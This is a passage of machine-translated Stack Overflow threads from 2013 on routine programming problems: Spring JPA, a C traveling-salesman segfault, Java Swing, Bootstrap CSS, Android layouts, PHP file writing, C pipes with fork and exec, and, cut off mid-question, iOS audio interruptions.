事实证明，这个问题是由与我的存储库层的冲突引起的。尽管我有一个`Order.findByUUID`命名查询并且我`OrderRepository`看起来像：

```
@Repository
public interface OrderRepository extends JpaRepository<OrderEntity, Integer> {
    OrderEntity findByUUID(@Param("uuid") String uuid);

    List<OrderEntity> findByInProduction(@Param("inProduction") Boolean inProduction);
} 
```

删除命名查询并将上述方法更改`findByUuid`为解决方案。我仍然不确定它为什么会失败，但这让我摆脱了这个问题并开始调试应用程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T11:59:37.217

stacktrace 显示您有一个 JPQL 查询（`repository.query.parser`行），其中包括类似于`.u`某些类型的对象的内容`OrderEntity`。也许文本搜索`.u`或`.u<space>`将帮助您发现问题？

它不必在`OrderEntity`类本身中。

# c - 分支定界问题的 C 代码

> ID：15845036
> 
> 赞同：1
> 
> 时间：2013-04-05T23:05:53.030
> 
> 标签：c, branch-and-bound

所以我认为我在正确的轨道上使用分支定界方法来解决我对旅行问题的启发式解决方案，但是，我的“最小”功能出现分段错误，但我仍然很难理解围绕算法。任何解决此问题的帮助将不胜感激。基本上该功能的要求（因为我的主要功能看起来很有趣）是程序应该占用多达 150 个城市，如果它在 60 秒内读取，我会得到奖励积分（这意味着我不会失败）输入文件会看起来like（例如）： c 1 c 2 a 1 2 300 其中“c”表示“创建城市”，“a”表示“添加边界”。这就是为什么我的程序是这样设置的。

```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int cost=0;
int main(){
int numcity ,a[151][151],visited[151],worthless,city1,city2,distance;
char citystring[2];
  a[1][1]=0;
  while(scanf("%s",citystring) != EOF){
  if(strcmp(citystring, "c") == 0){
    scanf("%d", &worthless);
    numcity++;
    }
  else if(strcmp(citystring, "a") == 0){
    scanf("%d %d %d",&city1,&city2,&distance);
    a[city1][city2] = distance;
    a[city2][city1] = distance;
    }
  }
  mincost(1,numcity,a,visited);
  printf("The minimum cost tour is %d",cost);

  return 0;
}

int mincost(int city,int n,int a[151][151],int visited[151]){
int i,ncity;
  visited[city]=1;
  printf("%d->",city);
  ncity=least(city,n,a,visited);
  if(ncity==999999){
    ncity=1;
    printf("%d",ncity);
    cost+=a[city][ncity];
  }
  mincost(ncity,n,a,visited);
}

int least(int c,int n,int a[151][151],int visited[10]){
int i,nc=999999,min=999999,kmin;
  for(i=1;i<=n;i++){
    if((a[c][i]!=0)&&(visited[i]==0)){
      if(a[c][i]<min){
        min=a[i][1]+a[c][i];
        kmin=a[c][i];
        nc=i;
      }
    }
  }
  if(min!=999999)
    cost+=kmin;
    return nc;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:26:44.813

您的程序核心转储到 mincost() 的最后一行，这是对 mincost() 的递归调用。

崩溃的原因是你正在吹（溢出）堆栈。

你有一个无限循环的递归等价物。

mincost应该什么时候返回？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:27:07.927

C 数组是 0 索引的，但是您的索引从 1..n 而不是 0..(n-1) 开始......这就是为什么您将它们声明为 151 而不是 150？

但是您的崩溃可能是由于 mincost 无条件地调用自己。您说您认为自己走在正确的轨道上，但是在围绕算法思考时遇到了麻烦……我认为这些陈述是不一致的。在尝试编码之前，您应该确保您了解该算法。

# java - 不能引用非最终变量（数组）

> ID：15845040
> 
> 赞同：-2
> 
> 时间：2013-04-05T23:06:10.760
> 
> 标签：java, arrays, swing, jbutton, actionlistener

以下程序应该接收 4 位颜色代码电阻的用户输入，然后继续在 JFrame 中打印它（目前已为 BufferedReader 和 JFrame 设置）但是，我知道我不能简单地在外部方法中打印一些东西进入内部方法。例如，我试图在输入通过后在动作侦听器中打印 array3，但是我得到了那个错误。

我试图在 main 方法中将某些变量设置为 final，在互联网上搜索了各种页面，但仍然找不到解决我的具体问题的方法。我之前确实在这里问过这个问题，但是，它会导致更多的混乱，因为试图用自己的方法重写我的代码 JFrame 会导致近乎混乱，因此我不得不返回到我的原始代码。我想知道如何获取该用户输入并将其传递给 JFrame 下面的那些方法，因为我现在正在尝试的方法肯定行不通。

```
import java.io.*;
import javax.swing.*;
import java.awt.event.*;
import java.util.Arrays;
import javax.swing.JFrame;

public class test extends JFrame
{
  public static void main (String [] args) throws IOException
  {
    BufferedReader myInput = new BufferedReader (new InputStreamReader (System.in));

    //calling variables
    String input;
    int numInput;

    JLabel l = new JLabel("Hello and welcome to the Program");
    l.setAlignmentX(0);
    l.setAlignmentY(0);

    //calling arrays
    int [] array = new int [5];
    int [] array2 = new int [3];
    String [] array3 = new String [3];
    String[] colours = {"black", "brown", "red", "orange", "yellow", "green", "blue", "violet", "gray", "white"};
    String[] tollerance = {"red", "gold", "silver", "no band"};

    JFrame f = new JFrame("Hello JFrame");
    f.setSize(500,500);
    //f.getContentPane().setBackground(Color.CYAN);
    f.add(l);
    f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    f.setVisible(true);
    f.setLocationRelativeTo(null);
    //JTextField t = new JTextField(16);

    /*SodaMachine machine = new SodaMachine(); //class name
     JButton cokeButton = new JButton();
     cokeButton.addActionListener(new ActionListener() {
     public void actionPerformed() {
     machine.dispenseCoke();
     }
     }); */

     JPanel p = new JPanel ();
     JButton b = new JButton("Press me") ;
     b.setAlignmentX(0);
     b.setAlignmentY(0);

     test x = new test();
     b.addActionListener(new ActionListener(){
     public void actionPerformed (ActionEvent e) {
     JOptionPane.showMessageDialog(null,"In the following program you (The user!) will input a number of a resistor value \nThe program will pass the information into methods and then proceed to print out \nThe coorelating colors (Press the button to be asked for input)");
     int number = Integer.parseInt(JOptionPane.showInputDialog("Please enter the resistor value"));

     JOptionPane.showMessageDialog(null, "The Colors are : " + array3[i]);

     } 

     });

     p.add(b);
     p.add(l);
     //p.add(t);
     f.add(p);

     System.out.println("Hello and welcome to the Program (Press any key to con't)");
     input = myInput.readLine ();

     System.out.println("In the following program you (The user!) will input a number of a resistor value");
     System.out.println("The program will pass the information into methods and then proceed to print out");
     System.out.println("The coorelating colors (Press any key to be asked for input)");
     input = myInput.readLine();

     System.out.println("Enter a resistor value (Note that resistors can only acount to 4 decimal places");
     input = myInput.readLine ();
     numInput = Integer.parseInt (input);

     //colours for values
     array2 = values(array, input, colours);
     for(int i = 0 ; i < 3; i++){
     array3[i] = digitColours(array2[i], colours);
     System.out.println(array3[i]);// prints colours for values
     }

     //prints 4th colour for multiplier
     System.out.println(decimalPlaces(input, colours));
     //tollerance band
     System.out.println(tollerance(input, tollerance));

     } 

     public static int[] values (int [] digit, String num, String[] colours)
     {

     String holder;
     double numHolder;
     int lengthOfInput;
     int holder2;

     //Rounding of the input
     lengthOfInput = num.length() - 3;
     numHolder = Double.parseDouble(num);
     numHolder = numHolder/(Math.pow(10,lengthOfInput));
     numHolder = (int)(Math.round(numHolder)+0.5);

     // first three digits
     for(int i = 0; i < 3; i++){
     holder = num.substring(i,i+1);
     digit[i] = Integer.parseInt(holder);
     }

     return new int[] {digit[0], digit[1], digit[2]} ;// return
     }

     public static String digitColours(int decimalPlace, String[] colours){
     //calling additional variables
     String answer;
     answer = colours[decimalPlace];
     return answer;
     }

     //method to find the multiplier
     public static String decimalPlaces(String input, String[] colours){
     //calling additional variables
     int length = input.length();
     String answer;

     length = length - 3;
     answer = colours[length];

     return answer;
     }

     public static String tollerance(String num, String[] tollerance){

     String holder;
     int holder2;
     double perError;

     //tollerance
     holder = num.substring(3,4);
     perError = Double.parseDouble(holder);
     holder2 = Integer.parseInt(num);
     // checks to see if above 5
     if(perError < 5){
     perError = perError/holder2 * 100;
     }
     else if(perError > 5){
     perError = 10 - perError;
     perError = perError/holder2 * 100;
     }

     //changing for colour
     if(perError <= 2){
     perError = 0;
     }else if(perError <= 5){
     perError = 1;
     }else if(perError <= 10){
     perError = 2;
     }else if(perError <= 20){
     perError = 3;
     }

     return tollerance[(int)perError];
     }
     } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-05T23:08:50.990

您的短期问题是您正在尝试对内部类中的方法使用局部非最终变量。这可以通过使用最终变量或类字段来解决（这里，因为它被用于静态方法，所以它必须是静态的）。

但是话虽如此，您的总体问题***仍然***是您已将所有内容都推入静态 main 方法（或任何类型的静态方法）。您绝对需要创建可用于创建对象的类。我相信我们最近已经讨论过这个问题。

* * *

**编辑**

我改变了主意——你的“模型”，你决定显示什么颜色字符串的代码可能只包含静态方法。它可能有一个看起来像这样的方法：

```
public class ResistorColorsUtility {
   // create a String array, ALL_COLORS, as a constant that the methods 
   // of this class can use.
   private static final String[] ALL_COLORS = { "black", "brown", "red",
         "orange", "yellow", "green", "blue", "violet", "gray", "white" };

   public static String[] getColorsForValue(int value) {
      // code in here will create an array of Strings for the value given and
      // return it 

      // here use value int to find all the appropriate colors
      // create String array called result to hold the color Strings
      String[] result = ......; // you've got to create this code!

      return result; // return the result
   }

   // it will likely have other public methods that the GUI could use

   // and other private methods that it will only use internally 
   // and will not be used by other classes
} 
```

GUI 具有用于输入和显示结果的字段，以及用于确定用户何时想要查看结果的按钮。main 方法只是让程序运行，这里创建一个 JFrame 来放置主 GUI 代码的 JPanel，然后显示该 JFrame。

```
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.*;

// A very simple GUI to illustrate a point
public class ResistorGui extends JPanel {
   private JButton findColorButton = new JButton("Find Colors");
   private JTextField valueInputField = new JTextField(2);
   private JTextField resultField = new JTextField(15);

   public ResistorGui() {
      // user shouldn't be able to edit result field
      resultField.setEditable(false);
      resultField.setFocusable(false);

      findColorButton.addActionListener(new ActionListener() {

         @Override
         public void actionPerformed(ActionEvent arg0) {
            // all program logic is in here

            // get value String from valueInputField
            // translate to int
            // call utility method from ResistorColorsUtil class!
            // display result in resultField
         }
      });

      add(new JLabel("Value:"));
      add(valueInputField);
      add(findColorButton);
      add(new JLabel("Result:"));
      add(resultField);
   }

   // all main does is to display the GUI, that's it
   public static void main(String[] args) {
      ResistorGui mainPanel = new ResistorGui();

      JFrame frame = new JFrame("ResistorGui");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(mainPanel);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);
   }
} 
```

# html - Box-sizing 属性无法按预期与 Bootstrap 列一起使用

> ID：15845041
> 
> 赞同：0
> 
> 时间：2013-04-05T23:06:13.053
> 
> 标签：html, css, twitter-bootstrap

我正在使用 Twitter 的 Bootstrap 来布置一个响应式网站。`.container`我在一个div内并排有两列。我想在容器的每一侧添加一个边框。当我这样做时，第二列被推到第一列之下。

```
.row {
    border-left: 1px solid red;
    border-right: 1px solid red;
} 
```

我想我可以用 CSS 属性纠正这个问题，`box-sizing`将 div 的边框合并到它的宽度中。但是，它不起作用。

```
* {
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
} 
```

任何想法为什么？**如何在不破解 Bootstrap 文件的情况下在每一侧添加边框？**

代码：http: [//jsfiddle.net/huV7A/13/](http://jsfiddle.net/huV7A/13/)

**编辑：**我正在尝试实现这一点，但在列外部有边框：http: [//jsfiddle.net/huV7A/12/](http://jsfiddle.net/huV7A/12/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:34:35.803

如果您可以使用 row-fluid，这里有一个干净的解决方案：http: [//jsfiddle.net/panchroma/S7pLe/](http://jsfiddle.net/panchroma/S7pLe/)

**CSS**

```
.row-fluid{
border-left:1px solid red;
border-right:1px solid red;
-webkit-box-sizing: border-box; /* Safari/Chrome, other WebKit */
-moz-box-sizing: border-box;    /* Firefox, other Gecko */
box-sizing: border-box;         /* Opera/IE 8+ */
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T02:23:39.093

原因是因为您已放置`margin-left`在两列中的每一列上。删除它可以立即解决问题。

但是，这会导致边框和内容之间的间距出现问题；因此我们添加了填充：

```
.span6 {
    margin-left: 0;
    padding-left: 20px;
} 
```

[http://jsfiddle.net/huV7A/14/](http://jsfiddle.net/huV7A/14/)

**注意**：这`margin-left`似乎是由 Bootstrap 添加的。

# android - 自定义视图元素周围不需要的额外填充

> ID：15845055
> 
> 赞同：1
> 
> 时间：2013-04-05T23:08:45.113
> 
> 标签：android, view, android-relativelayout, padding

**！！！问题解决了！！！**

**从代码中删除它后，问题被覆盖了 onLayout 函数，一切都按预期工作！**

我创建了自己的 View 对象扩展 RelativeLayout，它显示但它应用了一些额外的填充（如下图） - 灰色区域是添加到主 XML 布局的自定义元素的大小（大小符合预期），绿色是视图膨胀到根据上面元素的高度以某种方式采用额外填充的元素（如图 2 所示）。

为什么会这样？我希望 TextView（绿色部分）填充完整的父级（灰色部分），我还注意到它的大小合适，它只是向下移出了底部的屏幕。

任何人都可以帮我解决这个问题吗？

[屏幕 1 的图像](http://www.2i.cz/8a72c1eb38)

[屏幕 2 的图像](http://www.2i.cz/76be0d27f4)

**日志视图.xml**

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_gravity="top"
    android:gravity="top" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:background="@color/green"
        android:text="Medium Text"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <ImageButton
        android:id="@+id/imageButton1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"
        android:background="@android:color/darker_gray"
        android:src="@android:drawable/ic_media_pause" />

</RelativeLayout> 
```

**主要的.xml**

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent" >

<TextView
    android:id="@+id/stateLabel"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_above="@+id/logBox"
    android:layout_alignParentRight="true"
    android:layout_alignParentTop="true"
    android:text="@string/bt_status"
    tools:context=".MainActivity" />

<com.canlab.carguard.view.LogView
    android:id="@+id/logBox"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_alignParentLeft="true"
    android:layout_alignParentRight="true"
    android:layout_below="@+id/carLabel"
    android:background="@color/l_blue" />

<TextView
    android:id="@+id/driverLabel"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_alignParentTop="true"
    android:text="Řidič:"
    android:textAppearance="?android:attr/textAppearanceMedium" />

<TextView
    android:id="@+id/carLabel"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_below="@+id/driverLabel"
    android:text="Auto:"
    android:textAppearance="?android:attr/textAppearanceMedium" /> 
```

**日志视图类**

```
public class LogView extends RelativeLayout  {
private final static String TAG = "LogView";
private final LayoutInflater inflater;
private final int maxLines = 100;
private boolean scroll = true;
private final TextView log;
private final ImageButton pauseButton;

private int i = 0;

public LogView(Context context) {
    super(context);
    inflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    this.addView(inflater.inflate(R.layout.logview, null)); 
    pauseButton = (ImageButton) this.findViewById(R.id.imageButton1);
    log = (TextView) this.findViewById(R.id.textView1);

    initView(context);

    this.setScrollBarStyle(SCROLLBARS_INSIDE_OVERLAY);
}

public LogView(Context context, AttributeSet attrs, int defStyle) {

    super(context, attrs, defStyle);
    inflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    this.addView(inflater.inflate(R.layout.logview, null)); 
    pauseButton = (ImageButton) this.findViewById(R.id.imageButton1);
    log = (TextView) this.findViewById(R.id.textView1);
    initView(context);
}

public LogView(Context context, AttributeSet attrs) {
    super(context, attrs);
    inflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    this.addView(inflater.inflate(R.layout.logview,null));

    pauseButton = (ImageButton) this.findViewById(R.id.imageButton1);
    log = (TextView) this.findViewById(R.id.textView1);

    initView(context);

}

private void initView(Context context){
    log.setTextSize(15);
    log.setTypeface(Typeface.MONOSPACE);
    log.setGravity(Gravity.BOTTOM);
    log.setMovementMethod(new ScrollingMovementMethod());
}

@Override
protected void onLayout(boolean changed, int l, int t, int r, int b) {
    // TODO Auto-generated method stub
    for(int i = 0 ; i < getChildCount() ; i++){
        getChildAt(i).layout(l, t, r, b);

    }
} 
```

# java - 暂时禁用键输入java

> ID：15845057
> 
> 赞同：0
> 
> 时间：2013-04-05T23:08:51.573
> 
> 标签：java, user-interface, keyboard

我目前正在开发一个基本游戏，它使用带有 JProgressBars 的计时器来为角色统计添加填充效果。我遇到的一个问题是，如果在填充进度条之前选择了另一个字符，它会导致图形重叠并且看起来非常错误。计时器通过自定义操作类连接到 JButton，并且可以通过键导航按钮。我想要做的是在动作开始时禁用键输入，并在最长计时器结束时重新启用键。如果代码有帮助，请询问，我将上传文件。非常感谢任何和所有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:22:24.277

没有看到任何代码很难找到任何修复。但是，如果您的计时器是线程，那么线程组可能会很有用。这个怎么样：

```
public class MyWindow {
    Integer numTimersRunning = 0;
    ...
    {
            // timer started here
            numTimersRunning++;
            //timer does its thing and makes the progress bars go up.
            ...
            //timer finishes
            numTimersRunning--;
    }

    void keyPressed(MouseEvent e) {
     if(numTimersRunning > 0) 
              return;
     // do your keyboard input processing....
    }
} 
```

我不知道只是在黑暗中开枪，祝你好运。

ps：听起来你可能会遇到一些双重缓冲问题。查看[http://docs.oracle.com/javase/tutorial/extra/fullscreen/doublebuf.html](http://docs.oracle.com/javase/tutorial/extra/fullscreen/doublebuf.html)

# php - PHP 创建和编辑 TXT 文件

> ID：15845058
> 
> 赞同：0
> 
> 时间：2013-04-05T23:09:01.573
> 
> 标签：php, file, store

我已经尝试了一切，以及多个不同的源代码，我尝试过创建文件，所以 PHP 所要做的就是在其中写入，但仍然无法做到。

这是我在 index.html 上的 HTML

```
<form name="userinput" action="usersave.php" method="post">
Your name: <input type="text" name="username><br>
Your email: <input type="text" name="useremail"><br>
Your story: <textarea rows="3" cols="50" name="userstory"></textarea><br>
<input type="submit" value="Submit!" name="submit">
</form> 
```

这是我在 usersave.php 上的 PHP

```
<header>
<?php
    $file = 'output.txt';
    $buffer = $_POST['userstory'];

    if (file_exists($file)) {
            $buffer = file_get_contents($file) . "\n" . $buffer;
    }

    $success = file_put_contents($file, $buffer);
?>
</header> 
```

任何帮助表示赞赏，请，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:13:21.890

编辑：您需要安装某种服务器环境才能开始。

我推荐[WAMP](http://www.wampserver.com/en/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:17:56.017

如果您不使用任何主机，那么就没有服务器来运行 php，浏览器不会解析 PHP，服务器会解析，所以如果没有服务器，则不会解析任何 PHP。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T23:19:57.407

```
<?php
$file_path = "text_file.txt";
$file_handle = fopen($file_path, 'r'); // OPEN FILE READY FOR 'R'eading!
$text_data = fread($file_handle, filesize($file_path));  //Read actual data in file
print $text_data; // print the data you can use echo if you like
fclose($file_handle); // Close the file read / buffer

$data_to_write = "This is the data that will be written to disk!";
$file_path = "new_file.txt";
$file_handle = fopen($file_path, 'w');  // OPEN FILE READY FOR 'W'riting!
fwrite($file_handle, $data_to_write);
fclose($file_handle);
?> 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-05T23:21:21.577

> 我没有使用任何主机，而是直接从我的 PC 将文件打开到 Chrome 中。

如果没有服务器（例如 Apache），您将无法运行 PHP 文件。PHP 文件是“服务器端”脚本；脚本在服务器上执行，结果输出由服务器发送到浏览器。

看到这个问题：

[在没有 Web 服务器的情况下解析 HTML 中的 PHP 内容](https://stackoverflow.com/questions/4838612/parsing-php-content-in-html-without-webserver)

或者试试谷歌搜索

# c - 管道流和子进程

> ID：15845060
> 
> 赞同：0
> 
> 时间：2013-04-05T23:09:21.200
> 
> 标签：c, unix, exec, fork

我需要写我的管道流。我的程序应该获取另一个程序的名称并调用它们，第一个程序应该从第一个输出的 stdin 第二个读取，依此类推。最后一个程序在标准输出中打印结果。问题是它不起作用。当我将此程序调用到另外两个简单程序时（它们都是读取 x 并在它可以读取时打印 2*x），并给它一些数据，我想我应该立即得到结果，但我没有。更重要的是，当我给它文件结束时它没有反应。不要关注 safe_* 函数，它们与标准相同，但检查错误。请帮帮我=)

```
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "error.h"
#include "safe_functions.h"

void call(const char *filename, int in_descr, int out_descr, pid_t *sons, int n)
{
    sons[n] = safe_fork();
    if(sons[n] == 0)
    {
        safe_dup2(in_descr, STDIN_FILENO);
        safe_dup2(out_descr, STDOUT_FILENO);

        safe_execv(filename, (char **)NULL);
    }
}

int find_num(pid_t * sons, int n, pid_t id)
{
    for(int i=0; i<n; i++)
        if(sons[i] == id)
            return i;

    return -1;
}

int main(int argc, const char ** argv)
{

    int **descr;
    descr = (int**)safe_malloc(argc*sizeof(int*));
    for(int i=0; i<argc; i++)
        descr[i] = (int*) safe_malloc(2*sizeof(int));

    for(int i=1; i+1<argc; i++)
        safe_pipe(descr[i]);

    descr[0][0] = 0;
    descr[argc-1][1] = 1;

    pid_t *sons = safe_malloc((argc-1) * sizeof(pid_t));

    for(int i=1; i<argc; i++)
        call(argv[i], descr[i-1][0], descr[i][1], sons, i-1);

    int status;
    pid_t id;
    while(1)
    {
        id = safe_wait(&status);
        if(id == -1)
            break;

        if(WIFEXITED(status))
        {
            int num = find_num(sons, argc-1, id);
            safe_close(descr[num][0]);
            safe_close(descr[num+1][1]);
            continue;
        }

        if(WIFSIGNALED(status))
        {
            int num = find_num(sons, argc-1, id);
            fatal_error("Process was teminated by a signal", argv[num+1], WEXITSTATUS(status));
        }
    }

    free(sons);
    for(int i=0; i<argc; i++)
        free(descr[i]);
    free(descr);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T19:05:27.867

> 你没有足够的电话来`close()`！父级必须关闭其所有的管道副本。在将相关的管道描述符复制到标准输入和输出之后，孩子们也必须关闭每个管道描述符。否则，进程永远不会得到 EOF，因为有一个进程可以写入管道。

### SSCCE（[简短、独立、正确的示例](http://sscce.org/)）

此代码使用我的`stderr.h`和`stderr.c`代码代替您的`error.h`（如果您需要代码，请与我联系 - 请参阅我的个人资料）。它写出了`safe_*`函数——或者，至少，我对它们的实现。

该`dump_fds()`函数报告在 0-19 范围内打开了哪些文件描述符，这对于这个程序和大多数程序来说已经足够了；一个更复杂的版本`sysconf()`用于确定要检查的文件描述符的数量，但该数量通常比使用中的数量大得多（例如 256 或更大）。我用它作为一种简单的方法来检查所有应该关闭的文件描述符是否已关闭。

有相当多的调试输出。调用`execv()`提供了正确的参数列表。

```
#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

//#include "error.h"
//#include "safe_functions.h"

#include "stderr.h"

extern pid_t safe_fork(void);
extern void  safe_dup2(int old_fd, int new_fd);
extern void  safe_execv(const char *prog, char **argv);
extern void  safe_pipe(int *pipe_fds);
extern void *safe_malloc(size_t size);
extern int   safe_wait(int *status);
extern void  safe_close(int fd);

/* Report on open file descriptors (0..19) in process */
static void dump_fds(void)
{
    struct stat b;
    char buffer[32];
    sprintf(buffer, "%d: ", getpid());
    char *str = buffer + strlen(buffer);
    for (int i = 0; i < 20; i++)
        *str++ = (fstat(i, &b) == 0) ? 'o' : '-';
    *str++ = '\n';
    *str = '\0';
    fputs(buffer, stderr);
}

static void close_pipes(int **descr, int argc)
{
    for (int i = 0; i < argc; i++)
    {
        for (int j = 0; j < 2; j++)
        {
            if (descr[i][j] > 1)
            {
                err_remark("close %d\n", descr[i][j]);
                safe_close(descr[i][j]);
            }
        }
    }
}

static void call(char *filename, int in_descr, int out_descr, pid_t *sons, int n, int **descr, int argc)
{
    sons[n] = safe_fork();
    if (sons[n] == 0)
    {
        err_remark("call: %s\n", filename);
        char *argv[2] = { filename, NULL };
        err_remark("dup2(%d, %d)\n", in_descr, STDIN_FILENO);
        err_remark("dup2(%d, %d)\n", out_descr, STDOUT_FILENO);
        safe_dup2(in_descr, STDIN_FILENO);
        safe_dup2(out_descr, STDOUT_FILENO);
        close_pipes(descr, argc);
        dump_fds();
        safe_execv(argv[0], argv);
    }
}

static int find_num(pid_t *sons, int n, pid_t id)
{
    for (int i=0; i<n; i++)
    {
        if (sons[i] == id)
            return i;
    }
    return -1;
}

int main(int argc, char **argv)
{
    err_setarg0(argv[0]);
    err_setlogopts(ERR_PID);
    dump_fds();

    int **descr;
    descr = (int**)safe_malloc(argc*sizeof(int*));

    for (int i=0; i<argc; i++)
        descr[i] = (int*) safe_malloc(2*sizeof(int));

    for (int i=1; i+1<argc; i++)
        safe_pipe(descr[i]);

    descr[0][0] = 0;
    descr[argc-1][1] = 1;

    pid_t *sons = safe_malloc((argc-1) * sizeof(pid_t));

    for (int i=1; i<argc; i++)
    {
        err_remark("Command: %s\n", argv[i]);
        call(argv[i], descr[i-1][0], descr[i][1], sons, i-1, descr, argc);
    }

    close_pipes(descr, argc);

    while (1)
    {
        int status;
        pid_t id = safe_wait(&status);
        err_remark("wait: pid %d, status 0x%.4X\n", (int)id, status);

        if (id == -1)
            break;

        if (WIFEXITED(status))
        {
            int num = find_num(sons, argc-1, id);
            //safe_close(descr[num][0]);
            //safe_close(descr[num+1][1]);
            continue;
        }

        if (WIFSIGNALED(status))
        {
            int num = find_num(sons, argc-1, id);
            err_remark("Process %s was terminated by signal %d", argv[num+1], WEXITSTATUS(status));
        }
    }

    free(sons);
    for (int i=0; i<argc; i++)
        free(descr[i]);
    free(descr);

    return(0);
}

extern pid_t safe_fork(void)
{
    pid_t pid = fork();
    if (pid < 0)
        err_syserr("Failed to fork() ");
    return pid;
}

extern void safe_dup2(int old_fd, int new_fd)
{
    if (dup2(old_fd, new_fd) < 0)
        err_syserr("Failed to dup2(%d, %d) ", old_fd, new_fd);
}

extern void safe_execv(const char *prog, char **argv)
{
    execv(prog, argv);
    err_syserr("Failed to execv(\"%s\") ", prog);
}

extern void safe_pipe(int *pipe_fds)
{
    assert(pipe_fds != 0);
    if (pipe(pipe_fds) != 0)
        err_syserr("Failed to pipe() ");
    err_remark("pipe: %d, %d\n", pipe_fds[0], pipe_fds[1]);
}

extern void *safe_malloc(size_t size)
{
    void *vp = malloc(size);
    if (vp == 0)
        err_syserr("Out of memory ");
    return vp;
}

extern int safe_wait(int *status)
{
    assert(status != 0);
    return wait(status);
}

extern void safe_close(int fd)
{
    if (close(fd) < 0)
        err_syserr("Failed to close(%d)\n", fd);
} 
```

### 示例输出

```
$ ./pipes-15845060 /bin/ps /usr/bin/sort /bin/cat
12096: ooo-----------------
pipes-15845060: pid=12096: pipe: 3, 4
pipes-15845060: pid=12096: pipe: 5, 6
pipes-15845060: pid=12096: Command: /bin/ps
pipes-15845060: pid=12096: Command: /usr/bin/sort
pipes-15845060: pid=12096: Command: /bin/cat
pipes-15845060: pid=12096: close 3
pipes-15845060: pipes-15845060: pid=12098: pid=12096: close 4
pipes-15845060: pid=12096: close 5
pipes-15845060: pid=12096: close 6
call: /bin/ps
pipes-15845060: pid=12098: dup2(0, 0)
pipes-15845060: pid=12098: dup2(4, 1)
pipes-15845060: pid=12099: call: /usr/bin/sort
pipes-15845060: pid=12099: dup2(3, 0)
pipes-15845060: pid=12099: dup2(6, 1)
pipes-15845060: pid=12098: pipes-15845060: pid=12099: close 3
pipes-15845060: pid=12099: close 4
pipes-15845060: pid=12099: close 5
pipes-15845060: pid=12099: close 6
12099: ooo-----------------
close 3
pipes-15845060: pid=12098: close 4
pipes-15845060: pid=12098: close 5
pipes-15845060: pid=12098: close 6
12098: ooo-----------------
pipes-15845060: pid=12100: call: /bin/cat
pipes-15845060: pid=12100: dup2(5, 0)
pipes-15845060: pid=12100: dup2(1, 1)
pipes-15845060: pid=12100: close 3
pipes-15845060: pid=12100: close 4
pipes-15845060: pid=12100: close 5
pipes-15845060: pid=12100: close 6
12100: ooo-----------------
pipes-15845060: pid=12096: wait: pid 12098, status 0x0000
  563 ttys000    0:00.03 -sh
  568 ttys001    0:00.03 -sh
  578 ttys003    0:00.03 -sh
  587 ttys002    0:00.03 -sh
  588 ttys005    0:00.15 -sh
  589 ttys004    0:00.20 -sh
  PID TTY           TIME CMD
12096 ttys004    0:00.00 ./pipes-15845060 /bin/ps /usr/bin/sort /bin/cat
12097 ttys004    0:00.00 sed /./s/^/    /
12099 ttys004    0:00.00 /usr/bin/sort
12100 ttys004    0:00.00 /bin/cat
pipes-15845060: pid=12096: wait: pid 12100, status 0x0000
pipes-15845060: pid=12096: wait: pid 12099, status 0x0000
pipes-15845060: pid=12096: wait: pid -1, status 0x0000
$ 
```

# iphone - AUGraph 在 iOS 中的电话中断后停止运行

> ID：15845064
> 
> 赞同：5
> 
> 时间：2013-04-05T23:09:53.807
> 
> 标签：iphone, ios, ipad, core-audio, interrupt

我正在使用 AUGraph 和 AUSampler 将 MIDI 信号转换为音频。该应用程序运行正常，但如果应用程序被中断，即被电话或计时器中断，则会出现问题。中断后 AUGraph 停止运行并且没有任何声音。再次获得声音的唯一方法是重新启动应用程序。我正在使用标准方法来处理中断：

```
[[NSNotificationCenter defaultCenter] addObserver: self
                                         selector: @selector(handleInterruption:)
                                             name: AVAudioSessionInterruptionNotification
